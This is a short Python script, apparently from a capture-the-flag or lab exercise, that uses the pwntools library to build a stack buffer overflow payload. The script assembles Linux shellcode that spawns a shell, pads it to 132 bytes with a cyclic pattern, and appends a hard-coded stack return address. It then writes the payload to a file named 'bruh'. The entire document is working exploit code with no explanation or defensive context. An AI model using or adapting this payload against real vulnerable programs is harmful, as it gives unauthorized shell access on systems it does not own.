from pwn import *
add = 0xffffceec
a = asm(shellcraft.linux.sh())
a += cyclic(132-len(a))
a += p32(add)
print(a)
f = open("bruh","wb")
f.write(a)
f.close()
